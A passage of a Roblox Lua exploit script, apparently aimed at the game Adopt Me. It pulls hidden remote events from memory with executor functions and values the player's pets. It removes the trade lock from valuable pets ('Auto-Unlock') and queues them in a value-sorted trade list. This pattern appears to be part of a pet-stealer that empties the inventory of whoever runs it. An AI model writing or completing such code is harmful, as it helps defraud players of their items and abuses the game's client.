-- 5. HASH FINDER
local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do hashes[key] = value end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end
    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
    remote:FireServer(...)
end

-- 6. ACCURATE DUAL-CHECK VALUATION
local function getFinalValue(petData, props)
    local base = petData.rvalue or 0
    local rarity = petData.rarity or "common"
    
    -- Value Floor for Ultra-Rares and Legendaries
    if base < 0.01 then
        if rarity == "ultra_rare" then base = 0.05
        elseif rarity == "legendary" then base = 0.1
        else base = 0.005 end
    end

    local val = base
    if props.mega_neon or props.mega then val = val * 12
    elseif props.neon then val = val * 4 end
    if props.flyable then val = val + 0.8 end
    if props.rideable then val = val + 0.8 end
    
    return val * 56
end

-- 7. INVENTORY SCAN
local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
local InventoryDB = Fsys("InventoryDB")
local ClientData = Fsys("ClientData")

local function processInventory()
    local inv = ClientData.get("inventory")
    local total, petGroups, tradeList = 0, {}, {}

    for uid, pet in pairs(inv.pets or {}) do
        local petData = InventoryDB.pets[pet.id]
        if petData and not isBanned(petData.name, pet.id) then
            local props = pet.properties or {}
            local unitVal = getFinalValue(petData, props)
            
            if unitVal >= THRESHOLD then
                total = total + unitVal
                table.insert(tradeList, {uid = uid, val = unitVal})
                hashedAPI("BackpackAPI/SetItemLocked", uid, false) -- Auto-Unlock
                
                local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
                local emoji = ((props.mega or props.mega_neon) and "Ⓜ️" or props.neon and "⭐" or "🐾") .. (props.flyable and "🪽" or "") .. (props.rideable and "🏇" or "")
                
                if not petGroups[key] then
                    petGroups[key] = {name=petData.name, count=1, price=unitVal, emoji=emoji}
                else
                    petGroups[key].count = petGroups[key].count + 1
                end
            end
        end
    end
    local sorted = {}
    for _, v in pairs(petGroups) do table.insert(sorted, v) end
    table.sort(sorted, function(a, b) return a.price > b.price end)
    table.sort(tradeList, function(a, b) return a.val > b.val end)
    return sorted, total, tradeList
end

local sortedPets, grandTotal, finalTradeList = processInventory()

